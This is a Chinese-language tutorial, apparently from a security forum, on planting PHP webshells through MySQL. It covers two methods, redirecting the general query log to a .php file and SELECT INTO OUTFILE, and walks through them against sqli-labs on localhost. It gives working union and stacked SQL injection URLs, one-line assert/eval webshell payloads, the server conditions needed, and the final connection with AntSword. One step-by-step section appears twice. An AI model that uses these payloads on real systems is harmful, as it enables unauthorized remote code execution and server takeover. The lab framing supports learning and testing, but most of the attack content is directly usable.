日志写马
====

条件
--

1.全局变量`general_log`为ON

MySQL的两个全局变量：

`general_log`指的是日志保存状态，一共有两个值（ON/OFF）ON代表开启 OFF代表关闭。

`general_log_file` 指的是日志的保存路径。

```php
mysql> show global variables like "%general_log%";
+------------------+--------------------------------------------------------+
| Variable_name    | Value                                                  |
+------------------+--------------------------------------------------------+
| general_log      | OFF                                                    |
| general_log_file | D:\phpStudy\PHPTutorial\MySQL\data\DESKTOP-UQAMJKA.log |
+------------------+--------------------------------------------------------+
2 rows in set (0.02 sec)

```

如果目前这个`general_log`为off状态，那么日志就没有被记录进去，所以要先打开这个全局变量。

`set global general_log='on';`

打开过后，日志文件中就会记录我们写的sql语句。我这里用sqli-labs来进行执行sql语句：

`http://127.0.0.1/sqli-labs-master/Less-1/?id=-1%27%20union%20select%201,2,3--+`

打开`D:\phpStudy\PHPTutorial\MySQL\data\DESKTOP-UQAMJKA.log`日志文件，成功记录

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ba51a1eb042d738e1a61b0aee1c880f0e0820cae.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ba51a1eb042d738e1a61b0aee1c880f0e0820cae.png)

注：不管sql语句是否正确都会记录进去。

不过`general_log_file`可以直接通过SQL语句修改，而且必须修改为比如`php`后缀的文件，不然马不能被解析。下面讲第2点条件会详细说明。

2.需要`secure_file_priv`为空，即`secure_file_priv=""`；或者`secure_file_priv`为`general_log_file` 日志的保存路径的磁盘。不过`general_log_file`可以直接通过SQL语句修改，必须要修改为比如`php`后缀的文件，不然马不能被解析：

```php
mysql> set global general_log_file='D:/1.log';
Query OK, 0 rows affected (0.07 sec)

mysql> show variables like "%general%";
+------------------+----------+
| Variable_name    | Value    |
+------------------+----------+
| general_log      | ON       |
| general_log_file | D:/1.log |
+------------------+----------+
2 rows in set (0.03 sec)

#注：其中路径里的\用\\或者/代替，因为\的话会消失一个
mysql> set global general_log_file='D:\1.log';
Query OK, 0 rows affected (0.06 sec)

mysql> show variables like "%general%";
+------------------+---------+
| Variable_name    | Value   |
+------------------+---------+
| general_log      | ON      |
| general_log_file | D:1.log |
+------------------+---------+
2 rows in set (0.03 sec)

```

然后在D盘下就出现`1.log`成为新的日志文件了。但是最后也要考虑能不能成功的连接到马，像如果`secure_file_priv`固定为G:\\，而网站是搭在D盘上，那把`general_log_file`修改为G盘下的文件也连接不到，除非还有文件包含漏洞等等。

`show global variables like '%secure%'`;查看可以写入的磁盘。  
（1）当secure\_file\_priv为空，就可以写入磁盘的目录。  
（2）当secure\_file\_priv为G:\\，就可以写入G盘的文件。  
（3）当secure\_file\_priv为null，into outfile就不能写入文件。（注意NULL不是我们要的空，NULL和空的类型不一样）

secure\_file\_priv=""就是可以into outfile写入任意磁盘文件。

secure\_file\_priv设置通过设置my.ini来配置，不能通过SQL语言来修改，因为它是只读变量，secure\_file\_priv设置具体看这里：

若secure\_auth为ON，则用以下方法变为OFF（mysql查询默认是不区分大小写的）

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5242d13822b3bbbb2d0c8b96760af6ce1a13bba5.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5242d13822b3bbbb2d0c8b96760af6ce1a13bba5.png)

secure\_file\_priv不能通过此方法修改，因为报错为Variable 'XXX' is a read only variable。报错原因及修改方法为：  
参数为只读参数，需要在mysql.ini配置文件中更改该参数，之后重启数据库

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-af151b954ae47b50288298c9a9a72b55d2eb7a57.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-af151b954ae47b50288298c9a9a72b55d2eb7a57.png)

将secure\_file\_priv为空的正确方法（注意NULL不是我们要的空，NULL和空的类型不一样）

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-9410cb7535985a05f816233fc15434b4f98311c9.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-9410cb7535985a05f816233fc15434b4f98311c9.png)

3.对web目录有写权限MS的系统就不说了，一般都会有权限的，但是linux的系统，通常都是rwxr-xr-x，也就是说组跟其他用户都没有权限写操作。

4.知道物理路径（into outfile '物理路径'), 这样才能写对目录。

查`select @@b asedir;`——MySQL数据库安装的绝对路径：

```php
mysql> select @@b asedir;
+--------------------------------+
| @@b asedir                      |
+--------------------------------+
| D:/phpStudy/PHPTutorial/MySQL/ |
+--------------------------------+
1 row in set (0.07 sec)

```

5.（1）union注入在这里行不通。

因为要日志写马能够连接必须要修改`general_log_file`为比如`php`后缀的文件，不然马不能被解析。所以必须要先用到`set global general_log_file='...php';`，那么union注入就没机会了，union基本都是`?id=1 union select 1,2,select '<?php assert($_POST[v]);?>';`这样，不能执行`set`的。

（2）有堆叠注入，要先`?id=1;set global general_log_file='...php';`，然后直接执行`?id=1;select '<?php assert($_POST[v]);?>';`

不过首先要想有堆叠注入的条件，源码中必须要用到`mysqli_multi_query()`，那么我们此处就可以执行多个sql语句进行注入。一般后台查询数据库使用的语句都是用`mysql_query()`，所以堆叠注入在mysql上不常见。`mysqli_multi_query()`可以执行多个sql语句，而`mysqli_query()`只能执行一个sql语句。

堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。

（3）再者就是已经成功登录到别人的数据库里了，要先`set global general_log_file='...php';`，然后直接执行`select '<?php assert($_POST[v]);?>';`

6.对方没有对`'`和`"`进行过滤,因为outfile后面的物理路径必须要有引号

用法
--

例子：直接登录进别人的数据库的时候：

```php
set global general_log_file='...php';

select '<?php assert($_POST[v]);?>';
```

或者堆叠注入：

```php
set global general_log_file='...php';

?id=1;select '<?php assert($_POST[v]);?>';
或者直接?id=<?php assert($_POST[v]);?>;都可以了，因为sql语句不管对错日志都会记录
```

过程
--

这里展示下堆叠注入的日志写马过程，用的是sqli-labs的靶场：

实战中堆叠注入来日志写马就不能用`show`来看全局变量的值了，所以就直接用sql语句修改。

1.先设置`general_log`为on：

`http://127.0.0.1/sqli-labs-master/Less-38/?id=-1' union select 1,2,3;set global general_log='on';--+`

2.再设置`general_log_file`为一个php后缀文件：

`http://127.0.0.1/sqli-labs-master/Less-38/?id=-1' union select 1,2,3;set global general_log_file='D:\\phpStudy\\PHPTutorial\\WWW\\log.php';--+`

**注：其中路径里的`\`用`\\`或者/代替，因为`\`的话会消失一个**

在Navicat中查询可以看到真的被改了：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7533d99f22ded66e7ae6e609a4e56f1284298eac.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7533d99f22ded66e7ae6e609a4e56f1284298eac.png)

可以看到这里必须要知道网站的绝对路径了。

3.`secure_file_priv`设置只能通过设置my.ini来配置，不能直接通过SQL语句来修改，因为它是只读变量。而且这里也不能`show`来看，所以只能看缘分~

4.`http://127.0.0.1/sqli-labs-master/Less-38/?id=1';select '<?php assert($_POST[v]);?>';--+`

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-fd27f7a600ac8ff80b40a59459b07ec272db6a2b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-fd27f7a600ac8ff80b40a59459b07ec272db6a2b.png)

或者直接`?id=<?php assert($_POST[v]);?>;`都可以了，因为sql语句不管对错日志都会记录

5.最后可以用shell管理工具来连接了。比如我这里用蚁剑成功了：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a0b8b309892938b9950b7a4ce1a628782a31c833.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a0b8b309892938b9950b7a4ce1a628782a31c833.png)

直接成功登录数据库的日志写马可以说是方法和堆叠注入的差不多，就是可以用`show`来看全局变量的值。这里就不赘述了。

mysql into outfile注射一句话木马
=========================

条件
--

关于mysql into outfile注射，要使用`into outfile` 把木马写到web目录拿到webshell首先需要有几个条件：

1.就是mysql用户拥有file\_priv权限（不然就不能写文件或者读文件）

`show global variables like '%secure%'`;查看into outfile可以写入的磁盘。  
（1）当secure\_file\_priv为空，就可以写入磁盘的目录。  
（2）当secure\_file\_priv为G:\\，就可以写入G盘的文件。  
（3）当secure\_file\_priv为null，into outfile就不能写入文件。（注意NULL不是我们要的空，NULL和空的类型不一样）

secure\_file\_priv=""就是可以into outfile写入任意磁盘文件。

secure\_file\_priv设置通过设置my.ini来配置，不能通过SQL语言来修改，因为它是只读变量，secure\_file\_priv设置具体看这里：

若secure\_auth为ON，则用以下方法变为OFF（mysql查询默认是不区分大小写的）

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-79bcf9a5c9c04f7fae1fb442b477c0559de9ff89.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-79bcf9a5c9c04f7fae1fb442b477c0559de9ff89.png)

secure\_file\_priv不能通过此方法修改，因为报错为Variable 'XXX' is a read only variable。报错原因及修改方法为：  
参数为只读参数，需要在mysql.ini配置文件中更改该参数，之后重启数据库

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4356e429a125909f12fbe3ffec2e1c96c4a4238e.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4356e429a125909f12fbe3ffec2e1c96c4a4238e.png)

将secure\_file\_priv为空的正确方法（注意NULL不是我们要的空，NULL和空的类型不一样）

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8e782037a570a7e3937b5297248720291126d5b6.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8e782037a570a7e3937b5297248720291126d5b6.png)

2.对web目录有写权限MS的系统就不说了，一般都会有权限的，但是linux的系统，通常都是rwxr-xr-x，也就是说组跟其他用户都没有权限写操作。

3.知道物理路径（into outfile '物理路径'), 这样才能写对目录。

查`select @@b asedir;`——MySQL数据库安装的绝对路径：

```php
mysql> select @@b asedir;
+--------------------------------+
| @@b asedir                      |
+--------------------------------+
| D:/phpStudy/PHPTutorial/MySQL/ |
+--------------------------------+
1 row in set (0.07 sec)

```

4.（1）能够使用union 。（需要mysql 3以上的版本）这个条件是在url里才需要，如果直接登录进别人的数据库，那么就不需要能够使用union了

```php
例子：
?id=1 union select '<?php @e val($_POST['c']);?>' into outfile "C:/phpStudy/WWW/a.php"

?id=1')) UNION SELECT 1,2,'<?php @e val($_POST["v"]);?>' into outfile "D:\\phpStudy\\PHPTutorial\\WWW\\hack.php" --+
```

（2）或者有堆叠注入，就可以直接`?id=1;select '<?php @e val($_POST['c']);?>' into outfile "C:/phpStudy/WWW/a.php"`这样执行了。

不过首先要想有堆叠注入的条件，源码中必须要用到`mysqli_multi_query()`，那么我们此处就可以执行多个sql语句进行注入。一般后台查询数据库使用的语句都是用`mysql_query()`，所以堆叠注入在mysql上不常见。`mysqli_multi_query()`可以执行多个sql语句，而`mysqli_query()`只能执行一个sql语句。

堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。

（3）再者就是已经成功登录到别人的数据库里了，直接执行`select '<?php @e val($_POST['c']);?>' into outfile "C:/phpStudy/WWW/a.php"`

5.对方没有对`'`和`"`进行过滤,因为outfile后面的物理路径必须要有引号

所以，要满足这几个条件还是蛮高难度的。

如果都满足，写入成功了，那么就可以用shell管理工具进行Getshell了

MySQL写入数据select into outfile一句话木马用法
-----------------------------------

例子：直接登录进别人的数据库的时候：

```php
SELECT "<?php @e val($_POST['xiaohua']); ?>"
INTO OUTFILE '/tmp/test1.php'
```

在url里要用union：

```php
例子：
?id=1 union select '<?php @e val($_POST['c']);?>' into outfile "C:/phpStudy/WWW/a.php"

?id=1')) UNION SELECT 1,2,'<?php @e val($_POST["v"]);?>' into outfile "D:\\phpStudy\\PHPTutorial\\WWW\\hack.php" --+
```

或者堆叠注入：

```php
?id=1');SELECT '<?php @e val($_POST["v"]);?>' into outfile "D:\\phpStudy\\PHPTutorial\\WWW\\hack.php";--+
```

注意
--

其中路径里的`\`用`\\`或者`/`代替，因为`\`的话会消失一个

过程
--

1.判断注入类型

`http://127.0.0.1/sqli-labs-master/Less-7/?id=1'` 报错  
`http://127.0.0.1/sqli-labs-master/Less-7/?id=1')) --+` 正常

2.判断列数

`http://127.0.0.1/sqli-labs-master/Less-7/?id=1')) order by 3 --+` 正常

`http://127.0.0.1/sqli-labs-master/Less-7/?id=1')) order by 4 --+` 报错

说明存在3列

3.文件写入

1.判断注入类型

`http://127.0.0.1/sqli-labs-master/Less-7/?id=1'` 报错  
`http://127.0.0.1/sqli-labs-master/Less-7/?id=1')) --+` 正常

2.判断列数

`http://127.0.0.1/sqli-labs-master/Less-7/?id=1')) order by 3 --+` 正常

`http://127.0.0.1/sqli-labs-master/Less-7/?id=1')) order by 4 --+` 报错

说明存在3列

3.文件写入

`http://127.0.0.1/sqli-labs-master/Less-7?id=1')) UNION SELECT 1,2,'<?php @e val($_POST["v"]);?>' into outfile "D:\\phpStudy\\PHPTutorial\\WWW\\hack.php" --+`

或者`"D:/phpStudy/PHPTutorial/WWW/hack.php"`，就是不能`\`，经过测试这样导入不成功。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-552f39c375c5212fc08386ecd87c7c686fdc7942.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-552f39c375c5212fc08386ecd87c7c686fdc7942.png)

上面的图中报了错：`You have an error in your SQL syntax`,显示sql出错了，但是没有关系，我们可以在文件中看到hack.php已经生成了。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e0ef58e08c832fae54ed4ad81ae2f7aff1158d63.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e0ef58e08c832fae54ed4ad81ae2f7aff1158d63.png)

这时候用菜刀等webshell管理工具连接就可以了，我下面用的是蚁剑，可以看到连接成功。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d89d62169c433e22a1227ad7104484a250df1de7.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d89d62169c433e22a1227ad7104484a250df1de7.png)

堆叠注入：`http://127.0.0.1/sqli-labs-master/Less-40/?id=1');SELECT '<?php @e val($_POST["v"]);?>' into outfile "D:\\phpStudy\\PHPTutorial\\WWW\\hack.php";--+`

然后该目录下便生成了我们的马儿，用shell管理工具便可成功连接。从这里可以看到一定要知道网站的绝对路径。

直接成功登录数据库的into outfile写入一句话木马可以说是方法和前面两个的差不多，就是可以用`show`来看全局变量的值。这里就不赘述了。